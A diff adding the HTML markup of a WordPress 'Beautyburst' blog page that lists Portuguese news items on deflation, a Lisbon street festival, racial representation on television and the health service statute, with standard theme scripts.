+	<div class="featured-item-wrap group">
+		<div class="featured-item" style="background-image:url('thumb12.jpg');">
+			
+												
+						
+			<a class="featured-link" href="post/12/index.html" rel="bookmark">Combustíveis puxam deflação, mas alimentos sobem com alta do leite</a>
+			
+			<div class="featured-content">
+				<h3 class="featured-title">Combustíveis puxam deflação, mas alimentos sobem com alta do leite</h3>
+			</div>
+			
+		</div>
+		<div class="featured-item-bottom group">
+			
+							<div class="blog-card-author">
+					<a href="post/author/AgenciaBrasil/index.html"><img alt='' src='https://0.gravatar.com/avatar/?s=128&#038;d=mm&#038;r=g' srcset='https://1.gravatar.com/avatar/?s=256&#038;d=mm&#038;r=g 2x' class='avatar avatar-128 photo avatar-default' height='128' width='128' loading='lazy'/></a>
+				</div>
+						
+							<a class="blog-card-more-link" href="post/12/index.html">More <i class="fas fa-chevron-right"></i></a>
+						
+			<ul class="blog-card-meta group">
+				<li class="blog-card-date"><i class="far fa-calendar"></i>June 26, 2023</li>
+			</ul>
+			
+			<div class="blog-card-category group"><a href="post/category/beautyburst/index.html" rel="category tag">Beautyburst</a></div>
+
+		</div>
+	</div>
+</div>				</div>
+							<div>	
+					
+<div class="featured-item-outer group">
+	<div class="featured-item-wrap group">
+		<div class="featured-item" style="background-image:url('thumb10.jpg');">
+			
+												
+						
+			<a class="featured-link" href="post/10/index.html" rel="bookmark">Lisboa na Rua regressa com espetáculos ao ar livre</a>
+			
+			<div class="featured-content">
+				<h3 class="featured-title">Lisboa na Rua regressa com espetáculos ao ar livre</h3>
+			</div>
+			
+		</div>
+		<div class="featured-item-bottom group">
+			
+							<div class="blog-card-author">
+					<a href="post/author/Renascenca/index.html"><img alt='' src='https://2.gravatar.com/avatar/?s=128&#038;d=mm&#038;r=g' srcset='https://1.gravatar.com/avatar/?s=256&#038;d=mm&#038;r=g 2x' class='avatar avatar-128 photo avatar-default' height='128' width='128' loading='lazy'/></a>
+				</div>
+						
+							<a class="blog-card-more-link" href="post/10/index.html">More <i class="fas fa-chevron-right"></i></a>
+						
+			<ul class="blog-card-meta group">
+				<li class="blog-card-date"><i class="far fa-calendar"></i>June 26, 2023</li>
+			</ul>
+			
+			<div class="blog-card-category group"><a href="post/category/beautyburst/index.html" rel="category tag">Beautyburst</a></div>
+
+		</div>
+	</div>
+</div>				</div>
+							<div>	
+					
+<div class="featured-item-outer group">
+	<div class="featured-item-wrap group">
+		<div class="featured-item" style="background-image:url('thumb16.png');">
+			
+												
+						
+			<a class="featured-link" href="post/16/index.html" rel="bookmark">Desiludida, Ana Sofia Martins lamenta falta de representatividade racial na televisão portuguesa</a>
+			
+			<div class="featured-content">
+				<h3 class="featured-title">Desiludida, Ana Sofia Martins lamenta falta de representatividade racial na televisão portuguesa</h3>
+			</div>
+			
+		</div>
+		<div class="featured-item-bottom group">
+			
+							<div class="blog-card-author">
+					<a href="post/author/correio@flash.cofina.pt(Flash)/index.html"><img alt='' src='https://0.gravatar.com/avatar/?s=128&#038;d=mm&#038;r=g' srcset='https://1.gravatar.com/avatar/?s=256&#038;d=mm&#038;r=g 2x' class='avatar avatar-128 photo avatar-default' height='128' width='128' loading='lazy'/></a>
+				</div>
+						
+							<a class="blog-card-more-link" href="post/16/index.html">More <i class="fas fa-chevron-right"></i></a>
+						
+			<ul class="blog-card-meta group">
+				<li class="blog-card-date"><i class="far fa-calendar"></i>June 26, 2023</li>
+			</ul>
+			
+			<div class="blog-card-category group"><a href="post/category/beautyburst/index.html" rel="category tag">Beautyburst</a></div>
+
+		</div>
+	</div>
+</div>				</div>
+					</div>
+		<div class="slick-featured-nav"></div>
+	</div>
+</div>
+
+
+	
+	<div class="content-inner">
+	
+				
+				
+					
+			<div class="blog-content-wrap">
+									
+<article id="post-12" class="blog-card-wrap post-12 post type-post status-publish format-standard has-post-thumbnail hentry category-beautyburst">
+
+		<div class="blog-card group">
+			
+			<a href="post/12/index.html" class="blog-card-inner" style="background-image:url('thumb12.jpg');">
+			
+																
+								
+			</a>
+			
+			<div class="blog-card-bottom-outer">
+				<div class="blog-card-bottom">
+					
+											<div class="blog-card-author">
+							<a href="post/author/AgenciaBrasil/index.html"><img alt='' src='https://1.gravatar.com/avatar/?s=128&#038;d=mm&#038;r=g' srcset='https://2.gravatar.com/avatar/?s=256&#038;d=mm&#038;r=g 2x' class='avatar avatar-128 photo avatar-default' height='128' width='128' loading='lazy'/></a>
+						</div>
+										
+											<a class="blog-card-more-link" href="post/12/index.html">More <i class="fas fa-chevron-right"></i></a>
+										
+					<h2 class="blog-card-title"><a href="post/12/index.html" rel="bookmark">Combustíveis puxam deflação, mas alimentos sobem com alta do leite</a></h2>
+					
+					<ul class="blog-card-meta group">
+						<li class="blog-card-date"><i class="far fa-calendar"></i>June 26, 2023</li>
+					</ul>
+					
+											<div class="blog-card-excerpt">
+							<p>Longa vida aumentou mais de 25% e os derivados, em média, 14,06%</p>
+						</div>	
+										
+				</div>
+				<div class="blog-card-category group"><a href="post/category/beautyburst/index.html" rel="category tag">Beautyburst</a></div>
+			</div>
+			
+		</div>
+
+</article><!--/.post-->										
+<article id="post-10" class="blog-card-wrap post-10 post type-post status-publish format-standard has-post-thumbnail hentry category-beautyburst">
+
+		<div class="blog-card group">
+			
+			<a href="post/10/index.html" class="blog-card-inner" style="background-image:url('thumb10.jpg');">
+			
+																
+								
+			</a>
+			
+			<div class="blog-card-bottom-outer">
+				<div class="blog-card-bottom">
+					
+											<div class="blog-card-author">
+							<a href="post/author/Renascenca/index.html"><img alt='' src='https://0.gravatar.com/avatar/?s=128&#038;d=mm&#038;r=g' srcset='https://1.gravatar.com/avatar/?s=256&#038;d=mm&#038;r=g 2x' class='avatar avatar-128 photo avatar-default' height='128' width='128' loading='lazy'/></a>
+						</div>
+										
+											<a class="blog-card-more-link" href="post/10/index.html">More <i class="fas fa-chevron-right"></i></a>
+										
+					<h2 class="blog-card-title"><a href="post/10/index.html" rel="bookmark">Lisboa na Rua regressa com espetáculos ao ar livre</a></h2>
+					
+					<ul class="blog-card-meta group">
+						<li class="blog-card-date"><i class="far fa-calendar"></i>June 26, 2023</li>
+					</ul>
+					
+											<div class="blog-card-excerpt">
+							<p>A programação deste ano abre com o Festival Solo Fest, que leva ao Castelo de São Jorge duas noites de atuações intimistas.</p>
+						</div>	
+										
+				</div>
+				<div class="blog-card-category group"><a href="post/category/beautyburst/index.html" rel="category tag">Beautyburst</a></div>
+			</div>
+			
+		</div>
+
+</article><!--/.post-->										
+<article id="post-16" class="blog-card-wrap post-16 post type-post status-publish format-standard has-post-thumbnail hentry category-beautyburst">
+
+		<div class="blog-card group">
+			
+			<a href="post/16/index.html" class="blog-card-inner" style="background-image:url('thumb16.png');">
+			
+																
+								
+			</a>
+			
+			<div class="blog-card-bottom-outer">
+				<div class="blog-card-bottom">
+					
+											<div class="blog-card-author">
+							<a href="post/author/correio@flash.cofina.pt(Flash)/index.html"><img alt='' src='https://0.gravatar.com/avatar/?s=128&#038;d=mm&#038;r=g' srcset='https://2.gravatar.com/avatar/?s=256&#038;d=mm&#038;r=g 2x' class='avatar avatar-128 photo avatar-default' height='128' width='128' loading='lazy'/></a>
+						</div>
+										
+											<a class="blog-card-more-link" href="post/16/index.html">More <i class="fas fa-chevron-right"></i></a>
+										
+					<h2 class="blog-card-title"><a href="post/16/index.html" rel="bookmark">Desiludida, Ana Sofia Martins lamenta falta de representatividade racial na televisão portuguesa</a></h2>
+					
+					<ul class="blog-card-meta group">
+						<li class="blog-card-date"><i class="far fa-calendar"></i>June 26, 2023</li>
+					</ul>
+					
+											<div class="blog-card-excerpt">
+							<p>A atriz de 35 anos mostrou-se incomodada com o estado de coisas no pequeno ecrã nacional e até deu o exemplo de &#8216;A Única Mulher&#8217;, durante a sua participação no &#8216;Programa Cautelar&#8217;, da RTP.</p>
+						</div>	
+										
+				</div>
+				<div class="blog-card-category group"><a href="post/category/beautyburst/index.html" rel="category tag">Beautyburst</a></div>
+			</div>
+			
+		</div>
+
+</article><!--/.post-->										
+<article id="post-14" class="blog-card-wrap post-14 post type-post status-publish format-standard has-post-thumbnail hentry category-beautyburst">
+
+		<div class="blog-card group">
+			
+			<a href="post/14/index.html" class="blog-card-inner" style="background-image:url('thumb14.jpg');">
+			
+																
+								
+			</a>
+			
+			<div class="blog-card-bottom-outer">
+				<div class="blog-card-bottom">
+					
+											<div class="blog-card-author">
+							<a href="post/author/Renascenca/index.html"><img alt='' src='https://1.gravatar.com/avatar/?s=128&#038;d=mm&#038;r=g' srcset='https://2.gravatar.com/avatar/?s=256&#038;d=mm&#038;r=g 2x' class='avatar avatar-128 photo avatar-default' height='128' width='128' loading='lazy'/></a>
+						</div>
+										
+											<a class="blog-card-more-link" href="post/14/index.html">More <i class="fas fa-chevron-right"></i></a>
+										
+					<h2 class="blog-card-title"><a href="post/14/index.html" rel="bookmark">Estatuto do SNS não era necessário para ultrapassar problemas com décadas, diz sindicato</a></h2>
+					
+					<ul class="blog-card-meta group">
+						<li class="blog-card-date"><i class="far fa-calendar"></i>June 26, 2023</li>
+					</ul>
+					
+											<div class="blog-card-excerpt">
+							<p>SIM lembra que o Governo e os sindicatos iniciaram um processo de alteração à contratação coletiva e, a esse nível, aponta ao protocolo negocial um &#8220;grande pecado&#8221;: &#8220;o não reconhecimento da urgência…</p>
+						</div>	
+										
+				</div>
+				<div class="blog-card-category group"><a href="post/category/beautyburst/index.html" rel="category tag">Beautyburst</a></div>
+			</div>
+			
+		</div>
+
+</article><!--/.post-->								</div>
+			
+						<nav class="pagination group">
+			<ul class="group">
+			<li class="prev left"></li>
+			<li class="next right"></li>
+		</ul>
+	</nav><!--/.pagination-->
+			
+				
+	</div>
+</div><!--/.content-->
+
+
+	<div class="sidebar s1">
+		
+		<div class="sidebar-content">
+			
+						
+						
+						
+		</div><!--/.sidebar-content-->
+		
+	</div><!--/.sidebar-->
+	
+
+				</div><!--/.main-inner-->
+			</div><!--/.main-->	
+		</div><!--/.container-inner-->
+	</div><!--/.container-->
+	
+	<div class="clear"></div>
+	
+	<footer id="footer">
+	
+					
+				
+		<div id="footer-bottom">
+			
+			<a id="back-to-top" href="#"><i class="fas fa-angle-up"></i></a>
+				
+			<div class="pad group">
+				
+				<div class="grid one-full">
+					
+										
+					<div id="copyright">
+													<p>Beautyburst &copy; 2023. All Rights Reserved.</p>
+											</div><!--/#copyright-->
+					
+										<div id="credit">
+						<p>Powered by <a href="https://wordpress.org" rel="nofollow">WordPress</a>. Theme by <a href="http://alx.media" rel="nofollow">Alx</a>.</p>
+					</div><!--/#credit-->
+										
+																					
+				</div>
+							
+			</div><!--/.pad-->
+
+		</div><!--/#footer-bottom-->
+
+	</footer><!--/#footer-->
+	
+</div><!--/#wrapper-->
+
+<script type='text/javascript' src='jquery.fitvids.js?ver=6.0' id='shapebox-fitvids-js'></script>
+<script type='text/javascript' src='jq-sticky-anything.min.js?ver=6.0' id='shapebox-jq-sticky-anything-js'></script>
+<script type='text/javascript' src='scripts.js?ver=6.0' id='shapebox-scripts-js'></script>
+<script type='text/javascript' src='nav.js?ver=1684863807' id='shapebox-nav-script-js'></script>
+	<script>
+	/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
+	</script>
 	</body>
 </html>
